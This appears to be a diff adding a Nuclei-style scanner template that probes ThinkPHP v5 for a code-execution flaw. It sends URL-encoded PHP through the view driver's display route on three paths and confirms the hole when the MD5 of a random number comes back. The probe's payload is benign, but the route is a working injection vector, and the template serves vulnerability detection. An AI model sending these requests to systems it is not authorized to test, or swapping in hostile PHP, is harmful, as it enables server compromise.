@@ -1,0 +1,29 @@
+id: poc-local-thinkphp-v5-driver-display-rce
+
+info:
+  name: poc-local-thinkphp-v5-driver-display-rce
+  author: capiton
+  severity: critical
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5({{randInt}}));?%3E"
+      - "{{BaseURL}}/public/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5({{randInt}}));?%3E"
+      - "{{BaseURL}}/index.php?s=\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5({{randInt}}));?%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
+
